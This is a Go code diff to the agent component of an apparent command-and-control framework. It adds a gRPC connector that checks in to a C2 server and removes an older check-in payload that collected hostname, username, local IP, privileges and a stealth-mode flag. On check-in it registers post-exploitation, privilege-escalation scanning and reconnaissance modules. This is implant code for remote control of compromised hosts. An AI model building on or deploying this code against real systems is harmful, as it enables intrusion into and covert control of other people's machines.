@@ -105,6 +105,9 @@ func New(cfg *config.Config) (*Agent, error) {
 
 	brClient := NewBridgeClient(cfg, log)
 
+	// Create C2 connector
+	connector := NewgRPCConnector(cfg, log, kp, id)
+
 	agent := &Agent{
 		cfg:          cfg,
 		log:          log,
@@ -113,6 +116,7 @@ func New(cfg *config.Config) (*Agent, error) {
 		status:       types.AgentStatusOnline,
 		stopCh:       make(chan struct{}),
 		bridgeClient: brClient,
+		connector:    connector,
 		moduleManager: &ModuleManager{
 			modules: make(map[string]Module),
 			bridge:  brClient,
@@ -165,28 +169,23 @@ func (a *Agent) RegisterModule(m Module) {
 	a.log.Infof("registered module: %s (phase: %s)", m.Name(), m.KillChainPhase())
 }
 
-// CheckIn performs initial registration with the C2 server.
+// CheckIn performs initial registration with the C2 server via gRPC.
 func (a *Agent) CheckIn(ctx context.Context, serverAddr string) error {
 	hostname, _ := os.Hostname()
 
-	checkin := map[string]interface{}{
-		"agent_id":    a.id,
-		"hostname":    hostname,
-		"os":          runtime.GOOS,
-		"arch":        runtime.GOARCH,
-		"username":    os.Getenv("USER"),
-		"public_key":  hex.EncodeToString(a.keypair.PublicKey[:]),
-		"modules":     a.moduleList(),
-		"local_ip":    getLocalIP(),
-		"privileges":  getPrivileges(),
-		"stealth_mode": a.cfg.Agent.StealthMode,
+	// Connect to C2
+	if err := a.connector.Connect(ctx, serverAddr); err != nil {
+		return fmt.Errorf("connecting to C2: %w", err)
 	}
 
-	a.log.Infof("checking in to C2: %s (agent_id=%s)", serverAddr, a.id)
-	a.log.Debugf("checkin payload: %+v", checkin)
+	a.log.Infof("checking in to C2: %s (agent_id=%s, host=%s, os=%s)", serverAddr, a.id, hostname, runtime.GOOS)
 
-	// Store server's public key (received during TLS/gRPC handshake)
-	// In production, this is done via the gRPC interceptor
+	// Register connected module
+	a.moduleManager.mu.Lock()
+	a.moduleManager.modules["post_exploit"] = &PostExploitModule{agent: a}
+	a.moduleManager.modules["privesc_scan"] = &PrivescScanModule{agent: a}
+	a.moduleManager.modules["recon_basic"] = &ReconModule{agent: a}
+	a.moduleManager.mu.Unlock()
 
 	return nil
 }
